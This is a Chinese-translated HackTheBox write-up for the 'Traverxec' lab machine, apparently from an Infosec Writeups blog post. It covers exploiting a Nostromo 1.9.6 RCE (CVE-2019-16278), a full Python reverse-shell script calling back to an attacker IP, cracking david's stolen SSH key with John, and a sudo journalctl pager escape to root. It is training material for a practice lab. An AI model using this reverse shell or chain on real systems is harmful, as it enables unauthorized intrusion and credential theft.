<html>
<head>
<title>Traverxec — HackTheBox Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Traverxec — HackTheBox记录</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/traverxec-hackthebox-writeup-ed58642e94d8?source=collection_archive---------0-----------------------#2020-04-11">https://infosecwriteups.com/traverxec-hackthebox-writeup-ed58642e94d8?source=collection_archive---------0-----------------------#2020-04-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="1988" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Traverxec是一款容易难度的机器，本周退役。我们通过利用Nostromo目录遍历/ RCE获得初始访问权限。枚举Nostromo配置文件，我们知道Nostromo的主目录，它是作为特权用户运行的。对于root用户，我们利用了<code class="fe kf kg kh ki b">journalctl</code>上的sudo特权</h2></div><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi kj"><img src="../Images/f79b5ef3d1ef1bf03f4e58e11380b5a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bQgJYMwmg2FgIL_i9996hg.png"/></div></div></figure><h1 id="9d37" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">列举</h1><p id="258e" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi mj translated">像往常一样，让我们从Nmap扫描开始。</p><pre class="kk kl km kn gt ms ki mt mu aw mv bi"><span id="4226" class="mw kw iq ki b gy mx my l mz na"><strong class="ki ir">Nmap scan report for 10.10.10.165<br/>Host is up (0.15s latency).</strong></span><span id="1774" class="mw kw iq ki b gy nb my l mz na"><strong class="ki ir">PORT   STATE SERVICE VERSION<br/>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)<br/>|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)<br/>|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)<br/>80/tcp open  http    nostromo 1.9.6<br/>|_http-server-header: nostromo 1.9.6<br/>|_http-title: TRAVERXEC<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</strong></span></pre><p id="91a8" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe kf kg kh ki b"><strong class="lp ir">nostromo</strong></code>盒子上运行的是1.9.6版本。快速谷歌搜索显示，它容易受到目录遍历RCE。</p><div class="nh ni gp gr nj nk"><a href="https://www.exploit-db.com/exploits/47837" rel="noopener  ugc nofollow" target="_blank"><div class="nl ab fo"><div class="nm ab nn cl cj no"><h2 class="bd ir gy z fp np fr fs nq fu fw ip bi translated">攻击性安全利用数据库档案</h2><div class="nr l"><h3 class="bd b gy z fp np fr fs nq fu fw dk translated">nostromo 1.9.6 -远程代码执行。CVE-2019-16278。多平台远程利用</h3></div><div class="ns l"><p class="bd b dl z fp np fr fs nq fu fw dk translated">www.exploit-db.com</p></div></div><div class="nt l"><div class="nu l nv nw nx nt ny kt nk"/></div></div></a></div><pre class="kk kl km kn gt ms ki mt mu aw mv bi"><span id="4ad1" class="mw kw iq ki b gy mx my l mz na"><strong class="ki ir">root@kali:~/htb/boxes/traverxec# python 47837.py -h</strong></span><span id="5d79" class="mw kw iq ki b gy nb my l mz na"><strong class="ki ir">_____-2019-16278<br/>        _____  _______    ______   _____\    \   <br/>   _____\    \_\      |  |      | /    / |    |  <br/>  /     /|     ||     /  /     /|/    /  /___/|  <br/> /     / /____/||\    \  \    |/|    |__ |___|/  <br/>|     | |____|/ \ \    \ |    | |       \        <br/>|     |  _____   \|     \|    | |     __/ __     <br/>|\     \|\    \   |\         /| |\    \  /  \    <br/>| \_____\|    |   | \_______/ | | \____\/    |   <br/>| |     /____/|    \ |     | /  | |    |____/|   <br/> \|_____|    ||     \|_____|/    \|____|   | |   <br/>        |____|/                        |___|/</strong></span><span id="aaa4" class="mw kw iq ki b gy nb my l mz na"><strong class="ki ir">Usage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;</strong></span></pre><p id="bc1e" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">好的，这需要3个参数，IP，端口，命令。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi nz"><img src="../Images/ec5371a2cec5c15e1140e6898abdbb36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6ZobD6C5Lq2a7DzTG7v6Rw.png"/></div></div></figure><p id="e8a5" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">嘣，我们有代码执行。</p><h1 id="7c73" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">作为www-data的Shell</h1><p id="ae15" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">这是我的反向shell代码的内容，</p><pre class="kk kl km kn gt ms ki mt mu aw mv bi"><span id="f998" class="mw kw iq ki b gy mx my l mz na"><strong class="ki ir">root@kali:~/htb/boxes/traverxec# cat pythonshell.py <br/>import socket,subprocess,os;</strong></span><span id="2d57" class="mw kw iq ki b gy nb my l mz na"><strong class="ki ir">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</strong></span><span id="4cd4" class="mw kw iq ki b gy nb my l mz na"><strong class="ki ir">s.connect(("10.10.14.31",1234));<br/>os.dup2(s.fileno(),0);<br/>os.dup2(s.fileno(),1);<br/>os.dup2(s.fileno(),2);<br/>p=subprocess.call(["/bin/sh","-i"]);</strong></span></pre><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oa"><img src="../Images/49f09af5d4b83c74b47fc794855da9b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cIvuiVQjQXJHfYhVSpBfhQ.png"/></div></div></figure><p id="975d" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">枚举文件系统，我们找到配置文件<code class="fe kf kg kh ki b">nhttpd.conf</code></p><pre class="kk kl km kn gt ms ki mt mu aw mv bi"><span id="54dd" class="mw kw iq ki b gy mx my l mz na">www-data@traverxec:/var/nostromo/conf$ cat nhtt*<br/>cat nhtt*<br/># MAIN [MANDATORY]</span><span id="d3a7" class="mw kw iq ki b gy nb my l mz na">servername              traverxec.htb<br/>serverlisten            *<br/>serveradmin             david@traverxec.htb<br/>serverroot              /var/nostromo<br/>servermimes             conf/mimes<br/>docroot                 /var/nostromo/htdocs<br/>docindex                index.html</span><span id="7170" class="mw kw iq ki b gy nb my l mz na"># LOGS [OPTIONAL]</span><span id="efc5" class="mw kw iq ki b gy nb my l mz na">logpid                  logs/nhttpd.pid</span><span id="53f7" class="mw kw iq ki b gy nb my l mz na"># SETUID [RECOMMENDED]</span><span id="028b" class="mw kw iq ki b gy nb my l mz na">user                    www-data</span><span id="ec7f" class="mw kw iq ki b gy nb my l mz na"># BASIC AUTHENTICATION [OPTIONAL]</span><span id="356f" class="mw kw iq ki b gy nb my l mz na">htaccess                .htaccess<br/>htpasswd                /var/nostromo/conf/.htpasswd</span><span id="c83f" class="mw kw iq ki b gy nb my l mz na"># ALIASES [OPTIONAL]</span><span id="691f" class="mw kw iq ki b gy nb my l mz na">/icons                  /var/nostromo/icons</span><span id="2540" class="mw kw iq ki b gy nb my l mz na"># HOMEDIRS [OPTIONAL]</span><span id="8c5d" class="mw kw iq ki b gy nb my l mz na">homedirs                /home<br/>homedirs_public         public_www</span></pre><p id="ee20" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">这里有几件有趣的事情，首先是用户名<code class="fe kf kg kh ki b">david</code>和认证文件<code class="fe kf kg kh ki b">htpasswd</code>以及<code class="fe kf kg kh ki b">homedirs</code>。浏览文档以理解conf文件，</p><div class="nh ni gp gr nj nk"><a href="http://webcache.googleusercontent.com/search?q=cache:mWxM9bi5aK4J:www.nazgul.ch/dev/nostromo_man.html+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;gl=in" rel="noopener  ugc nofollow" target="_blank"><div class="nl ab fo"><div class="nm ab nn cl cj no"><h2 class="bd ir gy z fp np fr fs nq fu fw ip bi translated">戒灵. ch</h2><div class="nr l"><h3 class="bd b gy z fp np fr fs nq fu fw dk translated">提示:要在此页面上快速查找您的搜索词，请按Ctrl+F或⌘-F (Mac)并使用查找栏。NHTTPD(8)系统…</h3></div><div class="ns l"><p class="bd b dl z fp np fr fs nq fu fw dk translated">webcache.googleusercontent.com</p></div></div></div></a></div><p id="ac5e" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">这些是我们感兴趣的线，</p><blockquote class="ob oc od"><p id="ef90" class="ln lo oe lp b lq nc jr ls lt nd ju lv of ne ly lz og nf mc md oh ng mg mh mi ij bi translated">要通过HTTP为用户的主目录提供服务，请通过定义存储主目录的路径来启用homedirs选项，通常是<strong class="lp ir"> /home。</strong></p><p id="92b2" class="ln lo oe lp b lq nc jr ls lt nd ju lv of ne ly lz og nf mc md oh ng mg mh mi ij bi translated">主目录的内容处理方式与文档根目录中的目录完全相同。</p><p id="203c" class="ln lo oe lp b lq nc jr ls lt nd ju lv of ne ly lz og nf mc md oh ng mg mh mi ij bi translated">您可以通过<strong class="lp ir"> homedirs_public </strong>选项定义一个子目录，将主目录中的访问权限限制为一个子目录。</p></blockquote><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oi"><img src="../Images/de21af7a5686154331641ea93ab85e69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LspaqZIdF7Q1lN5T0s32oA.png"/></div></div></figure><p id="ae46" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe kf kg kh ki b">protected-file-area</code>看起来很有趣。</p><pre class="kk kl km kn gt ms ki mt mu aw mv bi"><span id="4bb8" class="mw kw iq ki b gy mx my l mz na">www-data@traverxec:/home/david/public_www/protected-file-area$ cat htaccess<br/>cat .htaccess<br/>realm David's Protected File Area. Keep out!</span></pre><p id="b76a" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe kf kg kh ki b">protected-file-area</code>的内容</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oj"><img src="../Images/e744c0ece5a0773080840dc50384b9d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RDhDxoIPXWf3OT3FMYj9EA.png"/></div></div></figure><h1 id="f10e" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">www-data -&gt;大卫</h1><p id="793a" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">将<code class="fe kf kg kh ki b">backup-ssh-identity-files.tgz</code>转移到我们的盒子上，它有<code class="fe kf kg kh ki b">david</code>的ssh文件夹。私钥<code class="fe kf kg kh ki b">id_rsa</code>被加密。让约翰去工作吧，他又来了。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi ok"><img src="../Images/6e7505907f523f7ecaac2f10e57c4aa6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DxHu5yst0tszu2gTIGAocg.png"/></div></div></figure><h1 id="9843" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">大卫-&gt;根</h1><p id="1ce0" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">大卫的家有单独的<code class="fe kf kg kh ki b">bin</code>目录。</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi ol"><img src="../Images/236baf5fee8c8182a13ecac1e8227839.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z81DkzaOENGJ5IofkeL6Cg.png"/></div></div></figure><p id="8240" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe kf kg kh ki b">server-stats.sh</code>在<code class="fe kf kg kh ki b">journalctl</code>上有一个有趣的sudo命令。</p><blockquote class="ob oc od"><p id="807d" class="ln lo oe lp b lq nc jr ls lt nd ju lv of ne ly lz og nf mc md oh ng mg mh mi ij bi translated">根据<a class="ae om" href="https://gtfobins.github.io/gtfobins/journalctl/" rel="noopener ugc nofollow" target="_blank"> gtfobins </a></p><p id="e04d" class="ln lo oe lp b lq nc jr ls lt nd ju lv of ne ly lz og nf mc md oh ng mg mh mi ij bi translated">journalctl调用默认的分页器，这个分页器可能会更少，其他函数也可能适用。</p></blockquote><p id="8325" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">我缩小了终端的尺寸，这样它就可以调用<code class="fe kf kg kh ki b">less</code></p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi on"><img src="../Images/35a0e256fd3acfd05a570267d4e5760c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MrkKr-RQUprp8BeL1k37WA.png"/></div></div></figure><p id="3c5b" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">这就是这周的内容。我希望你喜欢这篇文章。如果你喜欢这篇文章，请随意留下掌声或评论。</p><p id="288c" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><strong class="lp ir"> Final </strong>:我喜欢这个盒子的一点是，它不需要运行任何脚本来寻找晦涩的东西，它所需要的只是仔细的枚举，阅读文档，我认为这是任何顶级盒子的标志。</p><p id="135f" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">结束，</p><p id="8baa" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">普瑞瑟姆(赛博01:<a class="ae om" href="https://twitter.com/PreethamBomma_" rel="noopener ugc nofollow" target="_blank">https://twitter.com/cyber01_</a></p></div><div class="ab cl oo op hu oq" role="separator"><span class="or bw bk os ot ou"/><span class="or bw bk os ot ou"/><span class="or bw bk os ot"/></div><div class="ij ik il im in"><p id="ed33" class="pw-post-body-paragraph ln lo iq lp b lq nc jr ls lt nd ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><em class="oe">关注</em> <a class="ae om" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="oe"> Infosec报道</em> </a> <em class="oe">获取更多此类精彩报道。</em></p><div class="nh ni gp gr nj nk"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nl ab fo"><div class="nm ab nn cl cj no"><h2 class="bd ir gy z fp np fr fs nq fu fw ip bi translated">信息安全报道</h2><div class="nr l"><h3 class="bd b gy z fp np fr fs nq fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="ns l"><p class="bd b dl z fp np fr fs nq fu fw dk translated">medium.com</p></div></div><div class="nt l"><div class="ov l nv nw nx nt ny kt nk"/></div></div></a></div></div></div>    
</body>
</html>